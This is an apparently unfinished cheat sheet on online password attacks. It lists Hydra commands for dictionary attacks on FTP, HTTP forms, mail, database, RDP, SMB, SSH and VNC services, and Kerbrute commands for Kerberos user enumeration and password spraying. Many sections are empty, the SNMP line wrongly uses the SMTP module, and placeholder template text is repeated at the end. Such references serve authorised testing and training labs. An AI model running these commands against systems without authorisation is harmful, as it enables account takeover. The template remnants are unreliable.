# Password Cracking

## Summary

* [Hydra](#hydra)
    * [FTP](#ftp)
    * [HTTP Basic Auth](#http-basic-auth)
    * [HTTP GET](#http-get)
    * [HTTP POST](#http-post)
    * [IMAP/S](#imap/s)
    * [MSSQL SQL Server Authentication](#mssql-sqlserverauthentication)
    * [MySQL](#mysql)
    * [POP3/S](#pop3/s)
    * [PostgreSQL](#postegresql)
    * [RDP](#rdp)
    * [SMB](#smb)
    * [SMTP/S](#smtp/s)
    * [SNMP](#snmp)
    * [SSH](#ssh)
    * [Telnet](#telnet)
    * [VNC](#vnc)

 * [Medusa](#Medusa)
    * [FTP](#ftp)
    * [HTTP Basic Auth](#http-basic-auth)
    * [HTTP GET](#http-get)
    * [HTTP POST](#http-post)
    * [IMAP/S](#imap/s)
    * [MSSQL SQL Server Authentication](#mssql-sqlserverauthentication)
    * [MySQL](#mysql)
    * [POP3/S](#pop3/s)
    * [PostgreSQL](#postgresql)
    * [RDP](#rdp)
    * [SMB](#smb)
    * [SMTP/S](#smtp/s)
    * [SNMP](#snmp)
    * [SSH](#ssh)
    * [Telnet](#telnet)
    * [VNC](#vnc)

* [Patator](#patator)
    * [FTP](#ftp)
    * [HTTP Basic Auth](#http-basic-auth)
    * [HTTP GET](#http-get)
    * [HTTP POST](#http-post)
    * [IMAP/S](#imap/s)
    * [MSSQL SQL Server Authentication](#mssql-sqlserverauthentication)
    * [MSSQL Windows Authentication](#mssql-windowsauthentication)
    * [MySQL](#mysql)
    * [POP3/S](#pop3/s)
    * [PostgreSQL](#postegresql)
    * [RDP](#rdp)
    * [SMB](#smb)
    * [SMTP/S](#smtp/s)
    * [SNMP](#snmp)
    * [SSH](#ssh)
    * [Telnet](#telnet)
    * [VNC](#vnc)

* [NetExec](#nxc)
    * [FTP](#ftp)
    * [MSSQL SQL Server Authentication](#mssql-sqlserverauthentication)
    * [MSSQL Windows Authentication](#mssql-windowsauthentication)
    * [RDP](#rdp)
    * [SMB](#smb)
    * [SSH](#ssh)
    * [VNC](#vnc)

 * [Kerbrute](#kerbrute)
    * [Kerberos](#kerberos)

* [Good Practices](#good-practices)
* [Labs](#labs)
* [References](#references)

## Hydra
Hydra is ....
For the sake of simplicity, we will perform a dictionary attack against a single user. To specify a list of usernames you can use the -L flag.
Note that hydra will try each password against each user when the -L flag is specified, even after finding a valid pair of login/pass.
Use the -f flag to stop the attack when a a valid pair of credentials is found.

### FTP
```
hydra -l <username> -P <passwords.txt> 10.10.10.10 ftp
```

### HTTP Basic Auth
```
hydra -L '<users.txt>' -P '<passwords.txt>' 10.10.10.10 http-get /
```

### HTTP GET
```
hydra -L '<users.txt>' -P '<passwords.txt>' 10.10.10.10 http-get-form '<url>:<form _parameters>:<condition_string>'

e.g: hydra -l foobar -P rockyou.txt 10.10.10.10 http-get-form '/login/index.php:username=^USER^&password=^PASS^:Incorrect username or password'
```
Note : Use https-get-form module for https websites with get method.

### HTTP POST
```
hydra -L '<users.txt>' -P '<passwords.txt>' 10.10.10.10 http-post-form '<url>:<form _parameters>:<condition_string>'

e.g : hydra -l foobar -P rockyou.txt 10.10.10.10 http-post-form '/login/index.php:username=^USER^&password=^PASS^:S=logout.php'
```
It's important to choose a good condition string, otherwise hydra may return false positives. When facing a situation where the web server is not returning any error message after a failed authentication, we can use a condition string like
'S=logout.php' if this page was found during the file fuzzing enumeration. Indeed, this page must normally be visible after a successful login attempt.
Note : Use https-post-form module for https websites with post method.

### IMAP/S
```
hydra -L '<emails.txt>' -P '<passwords.txt>' 10.10.10.10 imap
```

### MSSQL SQL Server Authentication
MSSQL supports 02 main types of authentication : SQL server authentication and Windows authentication.
When it comes to SQL server authentication, the username and password are defined in SQL server and stored in the sys.sql_logins tables whereas in Windows authentication, the username and password are stored in the SAM or NTDS.dit database.
Thus, the accounts used for Windows authentication are local or domain windows accounts.
```
hydra -l '<user>' -P <passwords.txt> 10.10.10.10 mssql

e.g: hydra -l 'sa' -P rockyou.txt 10.10.10.10 mssql
```
Note : It's worth mentioning that hydra only supports MSSQL SQL Server Authentication

### MySQL
```
hydra -t 4 -L <users.txt> -P <passwords.txt> 10.10.10.10 mysql
```
Note : By default, the threshold lockout for MySQL is 100 (max_connect_errors = 100). Going beyond that limit will automatically lock your IP address and it will requires the database administrator intervention

### POP3/S
```
hydra -L '<emails.txt>' -P '<passwords.txt>' 10.10.10.10 pop3
```

Note: Consider switching to POP3s if you come across this error : Plaintext authentication disallowed on non-secure (SSL/TLS) connections.

```
hydra -L '<emails.txt>' -P '<passwords.txt>' 10.10.10.10 pop3s
```

### PostgreSQL
```
hydra -l '<user>' -P <passwords.txt> 10.10.10.10 postgres 
```

### RDP
```
hydra -L '<users.txt>' -P '<passwords.txt>' 10.10.10.10 rdp
```

### SMB
```
hydra -L '<users.txt>' -P '<passwords.txt>' 10.10.10.10 smb
```

### SMTP/S
```
hydra -L '<emails.txt>' -P '<wordlist.txt>' 10.10.10.10 smtp
```

### SNMP
```
hydra -L '<emails.txt>' -P '<passwords.txt>' 10.10.10.10 smtp
```

### SSH
```
hydra -L '<users.txt>' -P '<passwords.txt>' 10.10.10.10 ssh
```

### Telnet
```

```

### VNC
```
hydra -P <passwords.txt> -t1 10.10.10.10 vnc
```
Notes: 
1/ Usernames are not required when conducting a dictionary attack against vnc standard authentication 
2/By default VNC will block your IP address after five unsuccessful login attempts.

## Medusa

### FTP
```

```

### HTTP Basic Auth
```

```

### HTTP GET
```

```

### HTTP POST
```

```

### IMAP/S
```

```

### MSSQL
```

```

### MySQL
```

```

### POP3/S
```

```

### PostgreSQL
```

```

### RDP
```

```

### SMB
```

```

### SMTP/S
```

```

### SNMP
```

```

### SSH
```

```

### Telnet
```

```

### VNC
```

```

## Patator

### FTP
```

```

### HTTP Basic Auth
```

```

### HTTP GET
```

```

### HTTP POST
```

```

### IMAP/S
```

```

### MSSQL
```

```

### MySQL
```

```

### POP3/S
```

```

### PostgreSQL
```

```

### RDP
```

```

### SMB
```

```

### SMTP/S
```

```

### SNMP
```

```

### SSH
```

```

### Telnet
```

```

### VNC
```

```

## NetExec

### FTP
```

```

### MSSQL
```

```

### RDP
```

```

### SMB
```

```

### SSH
```

```

### VNC
```

```

## Kerbrute

### Kerberos
Users enumeration
```
kerbrute userenum --dc 10.10.10.10  -d <DOMAIN> <users.txt>
```

Brute force a single user's password using a wordlist
```
kerbrute bruteuser --dc 10.10.10.10 -d <DOMAIN> '<passwords.txt>' '<user>'
```

Password spraying
```
kerbrute passwordspray --dc 10.10.10.10 -d <DOMAIN> '<users.txt>' <password>
```

## Good Practices

## Labs

* [TryHackMe - Room Password Attacks](https://tryhackme.com/room/passwordattacks)
* [PortSwigger - Lab 2](https://portswigger.net)
* [HackTheBox - Lab 3](https://www.hackthebox.com)

## References

* [Blog title - Author (@handle) - Month XX, 202X](https://example.com)
















Quick explanation

```powershell
Exploit
```

### Subentry 1

### Subentry 2

## Labs

* [Root Me - Lab 1](https://root-me.org)
* [PortSwigger - Lab 2](https://portswigger.net)
* [HackTheBox - Lab 3](https://www.hackthebox.com)

## References

* [Blog title - Author (@handle) - Month XX, 202X](https://example.com)
* https://www.youtube.com/watch?v=-UY0fHckkGc

## Methodology

Quick explanation

```powershell
Exploit
```

### Subentry 1

### Subentry 2

